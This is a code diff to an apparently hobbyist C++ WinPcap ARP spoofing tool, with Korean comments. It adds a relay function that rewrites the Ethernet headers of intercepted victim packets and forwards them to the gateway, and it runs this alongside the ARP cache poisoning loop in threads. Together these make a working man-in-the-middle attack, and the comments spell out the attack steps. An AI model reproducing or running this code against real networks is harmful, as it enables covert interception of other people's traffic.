@@ -180,8 +180,7 @@ int Winpcap_Packet_System::open_device(pcap_t *_adhandle, int _flag)
 
 		Basic_addr.gate_mac = Send_ARP_For_Macaddr(adhandle, GET_GATEMAC_MODE);
 		Basic_addr.victim_mac = Send_ARP_For_Macaddr(adhandle, GET_VICTIMEMAC_MODE);
-		cout << " 으에ㅔㄱ게게" << endl;
-
+		
 		// 구해온 게이트 웨이 정보로 ARP SPOOFING 에 필요한 자료를 수집한다.
 	}
 	
@@ -534,11 +533,61 @@ void Winpcap_Packet_System::Send_Arp_Infection_Packet()
 			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
 			return;
 		}
-		for (int i = 0; i < 42; i++)
-			printf("%X ", temp[i]);
-
-		cout << " send " << endl;
+		
 		Sleep(1000);
+	}
+
+}
+
+void Winpcap_Packet_System::Send_Arp_Relay_Packet()
+{
+
+	struct pcap_pkthdr *header;
+	const u_char *pkt_data;
+	bool _check = false;
+	u_char for_change_packet[0xffff];
+
+	while (true) 
+	{
+
+		pcap_next_ex(adhandle, &header, &pkt_data);
+		_check = false;
+
+		for (int m = 0; m < 6; m++)
+		{
+			if (pkt_data[m] == Basic_addr.attacker_mac[m]) // 피해자가 공격자에게 보내는 패킷일때
+			{
+				_check = true;
+			}
+			else
+			{
+				_check = false;
+				break;
+			}
+		}
+
+		if (_check == true)
+		{
+
+			for (int n = 0; n < 6; n++)
+			{ //
+			  // 게이트웨어 맥 arp-a 를치면알수 있다.
+				for_change_packet[n] = Basic_addr.gate_mac[n];// _temp2->etc.ether_dhost[n]; // 공격자의 맥
+				for_change_packet[n + 6] = Basic_addr.attacker_mac[n];// _temsp2->etc.ether_shost[n];
+			}
+
+			for (int n = 12; n < header->len; n++)
+			{
+				for_change_packet[n] = pkt_data[n];
+			}
+
+			if (pcap_sendpacket(adhandle, for_change_packet, header->len) != 0)
+			{
+				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
+				return;
+			}
+		}
+
 	}
 
 }
@@ -570,8 +619,6 @@ void Winpcap_Packet_System::_RunArpSpoofing()
 	else
 	{
 
-		cout << "떼엑";
-		
 		// Victim 정보획득
 		// 상대방 ip만 알아도 모든 정보를 불러올 수 있도록 자동화해야 한다.
 		// 1. GateWay IP 와 GateWay Mac 을 알아야 된다.
@@ -585,8 +632,27 @@ void Winpcap_Packet_System::_RunArpSpoofing()
 		// 2. 감염 성공시 arp -a 명령어를 통해 확인할 수 있다. (인터넷도 끊긴다 )
 		// 3. 정보 획득으로 얻은 정보를 통해 나 자신(공격자)로 부터 희생자로부터 infection 패킷을 전송한다.
 
+
 		// -> void Send_Arp_Infection_Packet();
-		Send_Arp_Infection_Packet(); // 이거 어택커 게이트로 해야됨.
+		
+		//std::thread InfectThread(&Winpcap_Packet_System::Send_Arp_Infection_Packet, Winpcap_Packet_System());
+		//std::thread RelayThread(&Winpcap_Packet_System::Send_Arp_Relay_Packet, Winpcap_Packet_System());
+		
+		//Send_Arp_Infection_Packet();
+		//InfectThread.join();
+		//RelayThread.join]
+		std::thread* InfectThread;
+		std::thread* RelayThread;
+
+		InfectThread = new std::thread(&Winpcap_Packet_System::Send_Arp_Infection_Packet, this);
+		RelayThread = new std::thread(&Winpcap_Packet_System::Send_Arp_Relay_Packet, this);
+
+		InfectThread->join();
+		RelayThread->join();
+
+		 // Or you could use std::unique_ptr<>.
+								 /****/
+	
 
 		// Arp Relay 패킷을 만들어야 한다. ( source 공유기 destination 희생자 )
 		// 1. ARP_INFECTION 만 진행하면 나 자신도 희생자에 의해서 감염되기 때문에
@@ -595,8 +661,6 @@ void Winpcap_Packet_System::_RunArpSpoofing()
 		//	  나 자신과 통신하는게 아닌 공유기와 통신하는척 속여야 한다.
 
 		// -> void Make_Arp_Relay_Packet();
-
-
 
 	}
 
